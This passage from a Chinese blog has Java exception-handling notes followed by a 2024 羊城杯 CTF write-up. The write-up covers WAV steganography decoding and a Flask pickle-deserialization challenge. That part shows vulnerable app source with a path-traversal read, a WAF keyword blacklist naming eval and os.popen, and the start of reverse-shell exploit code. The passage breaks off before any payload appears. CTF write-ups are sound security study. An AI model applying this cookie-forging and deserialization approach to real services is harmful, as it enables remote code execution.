title="解决默认方法冲突"></a>解决默认方法冲突</h4><p>如果先在一个接口中将一个方法定义为默认方法，然后又在超类或另一个接口中定义同样的方法，会发生什么情况？</p><ol><li>超类优先。如果超类提供了一个具体的方法，同名而且具有相同参数类型的默认方法会被忽略。</li><li>接口冲突。如果一个接口提供了一个默认方法，另一个接口提供了一个同名而且参数类型（不管是否是默认参数）相同的方法，必须覆盖这个方法来解决冲突。</li></ol><p>两个接口如果冲突并不重要。如果至少有一个接口提供了一个实现，编译器就会报告错误，程序员就必须解决这个二义性。</p><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><h4 id="处理错误"><a href="#处理错误" class="headerlink" title="处理错误"></a>处理错误</h4><p>异常处理的任务就是将控制权从产生错误的地方转移到能够处理这种情况的错误处理器。</p><p>在Java中，如果某个方法不能够采用正常的途径完成它的任务，可以通过另外一个路径退出方法。在这种情况下，方法并不返回任何值，而是抛出了一个封装了错误信息的对象。需要注意的是，这个方法将会立刻退出，并不返回正常值。此外，也不会从调用这个方法的代码继续执行，取而代之的是，异常处理机制开始搜索能够处理这种异常状况的异常处理器。</p><p>异常对象都是派生于<code>Throwable</code>类的一个类实例。如果Java中内置的异常类不能满足需求，用户还可以创建自己的异常类。</p><p>所有的异常都是有<code>Throwable</code>继承而来，但在下一层立即分解为两个分支：<code>Error</code>和<code>Exception</code>。</p><p><code>Erroe</code>类层次结构描述了Java运行时系统的内部错误和资源耗尽错误。</p><p><code>Exception</code>类层次结构又分解为两个分支：一个分支派生于<code>RuntimeException</code>；另一个分支包含其他异常。一般的规则是由编程错误导致的异常属于<code>RuntimeException</code>；如果程序本身没有问题，但由于像<code>I/O</code>错误这类问题导致的异常属于其他异常（<code>IOException</code>）。</p><p>Java语言规范将派生于<code>Error</code>类或<code>RuntimeException</code>类的所有异常称为非检查型异常，所有其他的异常称为检查型异常。</p><p>要在方法的首部指出这个方法可能抛出一个异常，所以要修改方法首部，以反映这个方法可能抛出的检查型异常。如果一个方法有可能抛出多个检查型异常类型，那么就必须在方法的首部列出所有的异常类。</p><ol><li>不需要声明Java的内部错误，即从Error继承的异常。</li><li>也不应该声明从<code>RuntimeException</code>继承的那些非检查型异常。</li></ol><blockquote><p>如果在子类中覆盖了超类的一个方法，子类方法中声明的检查型异常不能比超类方法中声明的异常更通用（子类方法可以抛出更特定的异常，或者根本不抛出任何异常。）如果超类方法没有抛出任何检查型异常，子类也不能抛出任何检查型异常。</p></blockquote><p>如果类中的一个方法声明它会抛出一个异常，而这个异常时某个特定类的实例，那么这个方法抛出的异常可能属于这个类，也可能属于这个类的一个子类。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">EOFException</span></code></pre><p>抛出异常非常容易：</p><ol><li>找到一个合适的异常类。</li><li>创建这个类的一个对象。</li><li>将对象抛出。</li></ol><p>一旦方法抛出了异常，这个方法就不会返回到调用者。也就是说，不必操心建立一个默认的返回值或错误码。</p><h4 id="创建异常类"><a href="#创建异常类" class="headerlink" title="创建异常类"></a>创建异常类</h4><p>我们需要做的只是定义一个派生于<code>Exception</code>的类，或者派生于<code>Exception</code>的某个子类，如<code>IOException</code>。习惯做法是，自定义的这个类应该包含两个构造器，一个是默认的构造器，另一个是包含详细描述信息的构造器（超类<code>Throwable</code>的<code>toString</code>方法会返回一个字符串，其中包含这个详细信息，这在调试中非常有用）。</p><h4 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h4><p>要想捕获一个异常，需要设置<code>try/catch</code>语句块：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> in <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> exception<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    exception<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>如果try语句块中的任何代码抛出了catch子句中指定的一个异常类，那么</p><ol><li>程序将跳过try语句块的其余代码。</li><li>程序将执行catch子句中的处理器代码。</li></ol><p>如果<code>try</code>语句块中的代码没有抛出任何异常，那么程序将跳过<code>catch</code>子句。</p><p>如果方法中的任何代码抛出了<code>catch</code>子句中没有声明的一个异常类型，那么这个方法就会立即退出（希望它的调用者为这种类型的异常提供了<code>catch</code>子句）。</p><p>一般的经验是，要捕获那些你知道如何处理的异常，而继续传播那些你不知道怎样处理的异常。</p><h4 id="捕获多个异常"><a href="#捕获多个异常" class="headerlink" title="捕获多个异常"></a>捕获多个异常</h4><p>在一个<code>try</code>语句块中可以捕获多个异常类型，并对不同类型的异常做出不同的处理，要为每个异常类型使用一个单独的<code>catch</code>子句。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>异常对象可能包含有关异常性质的信息。要想获得这个对象的更多信息，可以尝试使用<code>e.getMessage()</code>得到详细的错误信息。</p><h4 id="finally子句"><a href="#finally子句" class="headerlink" title="finally子句"></a><code>finally</code>子句</h4><p>不管是否有异常被捕获，<code>finally</code>子句中的代码都会被执行：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>    <span class="token class-name">FileInputStream</span> in <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span>    <span class="token punctuation">&#123;</span>        in <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> exception<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exception<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">finally</span>    <span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>其实这里的<code>finally</code>子句也有可能抛出异常。</p><blockquote><p><code>finally</code>子句的体要用于清理资源。不要把改变控制流的语句（<code>return,throw,break,continue</code>）放在<code>finally</code>子句中。</p></blockquote><h4 id="try-with-Resources语句"><a href="#try-with-Resources语句" class="headerlink" title="try-with-Resources语句"></a><code>try-with-Resources</code>语句</h4><p><code>try-with-Resources</code>语句（带资源的<code>try</code>语句）的最简形式为：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">Resource</span> res <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    work <span class="token keyword">with</span> <span class="token namespace">res</span><span class="token punctuation">&#125;</span></code></pre><p><code>try</code>块退出时，会自动调用<code>res.close()</code>。</p><h3 id="使用异常的技巧"><a href="#使用异常的技巧" class="headerlink" title="使用异常的技巧"></a>使用异常的技巧</h3><ol><li>异常处理不能代替简单的测试。</li><li>不要过分地细化异常。</li><li>充分利用异常层次结构。</li><li>不要压制异常。</li><li>在检测错误时，“苛刻’要比放任更好。</li><li>不要羞于传递异常。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024羊城杯</title>
      <link href="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
      <url>/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="Hiden"><a href="#Hiden" class="headerlink" title="Hiden"></a>Hiden</h4><p>对原有文本进行rot47和rot13解密得到wav的加密脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wave <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    txt_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    file_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>txt_data<span class="token punctuation">)</span>    txt_data <span class="token operator">=</span> file_len<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> byteorder <span class="token operator">=</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token operator">+</span> txt_data<span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.wav"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    attrib <span class="token operator">=</span> f<span class="token punctuation">.</span>getparams<span class="token punctuation">(</span><span class="token punctuation">)</span>        wav_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span> f<span class="token punctuation">.</span>readframes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>txt_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    wav_data<span class="token punctuation">[</span>index <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> txt_data<span class="token punctuation">[</span>index<span class="token punctuation">]</span>    <span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"hiden.wav"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>setparams<span class="token punctuation">(</span>attrib<span class="token punctuation">)</span>     f<span class="token punctuation">.</span>writeframes<span class="token punctuation">(</span>wav_data<span class="token punctuation">)</span></code></pre><p>对脚本进行逆向即可得到flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wave<span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"hiden.wav"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    attrib <span class="token operator">=</span> f<span class="token punctuation">.</span>getparams<span class="token punctuation">(</span><span class="token punctuation">)</span>    wav_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readframes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>hidden_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>wav_data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hidden_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>wav_data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>file_len <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hidden_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>extracted_data <span class="token operator">=</span> hidden_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span>file_len <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>extracted_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="hidden.png" loading="lazy"></p><h4 id="Lyrics-For-You-pickle反序列化"><a href="#Lyrics-For-You-pickle反序列化" class="headerlink" title="Lyrics For You(pickle反序列化)"></a>Lyrics For You(pickle反序列化)</h4><p>通过文件读取读取源码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># app.py</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token comment"># from config.secret_key import secret_code</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> cookie <span class="token keyword">import</span> set_cookie<span class="token punctuation">,</span> cookie_check<span class="token punctuation">,</span> get_cookie<span class="token keyword">import</span> pickleapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> random<span class="token punctuation">.</span>randbytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">UserData</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token keyword">def</span> <span class="token function">Waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/lyrics"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain; charset=UTF-8'</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"lyrics"</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/lyrics"</span><span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            res <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No lyrics found"</span>    <span class="token keyword">return</span> res<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> UserData<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> res<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/board"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">board</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    invalid <span class="token operator">=</span> cookie_check<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> invalid<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Nope, invalid code get out!"</span>    data <span class="token operator">=</span> get_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>分析<code>cookie.py</code>逻辑,构造exp如下，直接反弹shell</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> hmac<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response<span class="token punctuation">,</span> request<span class="token builtin">unicode</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token builtin">basestring</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token comment"># Quoted from python bottle template, thanks :D</span><span class="token keyword">def</span> <span class="token function">cookie_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token operator">+</span> sig <span class="token operator">+</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token operator">+</span> msg<span class="token keyword">def</span> <span class="token function">cookie_decode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word <span class="token keyword">in</span> data<span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment"># print(word)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token keyword">def</span> <span class="token function">cookie_check</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> waf<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span 